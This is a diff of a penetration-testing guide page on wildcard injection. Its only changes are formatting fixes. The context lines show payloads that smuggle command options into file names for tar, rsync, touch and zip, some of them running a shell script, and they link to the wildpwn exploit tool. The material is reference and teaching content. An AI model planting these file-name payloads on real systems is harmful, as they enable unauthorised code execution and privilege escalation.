@@ -24,7 +24,7 @@ touch "--reference=/my/own/path/filename"
 ```
 
 You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(combined attack)_\
-__More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
+More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
 
 ## Tar
 
@@ -36,7 +36,7 @@ touch "--checkpoint-action=exec=sh shell.sh"
 ```
 
 You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar attack)_\
-__More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
+More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
 
 ## Rsync
 
@@ -54,7 +54,7 @@ touch "-e sh shell.sh"
 ```
 
 You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(_rsync _attack)_\
-__More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
+More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
 
 ## 7z
 
@@ -84,7 +84,7 @@ _More info in Write-ups of the box CTF from HackTheBox._
 zip name.zip files -T --unzip-command "sh -c whoami"
 ```
 
-__
+
 
 
 <details>
